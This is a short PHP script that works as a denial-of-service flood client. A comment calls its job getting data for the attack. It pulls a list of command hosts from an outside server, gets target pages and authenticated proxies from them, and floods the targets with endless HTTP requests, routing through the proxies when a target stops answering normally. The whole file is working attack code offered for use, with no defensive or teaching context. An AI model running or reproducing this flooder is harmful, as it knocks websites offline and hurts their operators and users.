<?php

    $total = 0;
    $count = 0;

    $sessionMaxRequests = 5000;

    $hosts = json_decode(file_get_contents('http://rockstarbloggers.ru/hosts.json'), true);

    while (true) {
        try {
            // отримую дані для атаки
            echo "GET DATA \n";
            $count = 0;
            $data = @file_get_contents($hosts[array_rand($hosts)]);

            if(!$data){
                echo "Waiting...\n";
                sleep(5);
            }

            $data = json_decode($data, true);

            $code = request($data['site']['page']);

            if($code != 200){
                foreach ($data['proxy'] as $proxy) {
                    while (true){
                        request($data['site']['page'], $proxy['ip'], $proxy['auth']);
                        if($count > $sessionMaxRequests){
                            break;
                        }
                    }
                }
            }else{
                while (true){
                    request($data['site']['page']);
                    if($count > $sessionMaxRequests){
                        break;
                    }
                }
            }
        } catch (\Exception $e) {
            sleep(5);
        }

    }

    function request($url, $ip = false, $auth = false){
        global $total;
        global $count;

        $total++;
        $count++;

        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,10);
        if($ip) curl_setopt($curl, CURLOPT_PROXY, $ip);
        if($auth) curl_setopt($curl, CURLOPT_PROXYUSERPWD, $auth);

        curl_exec($curl);
        $httpcode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
        curl_close($curl);
        echo $url . ' | HTTP code: ' . $httpcode . ($ip && $auth ? ' with proxy ' : '') . " | " . $total . " / " . $count . "\n";
        return $httpcode;
    }
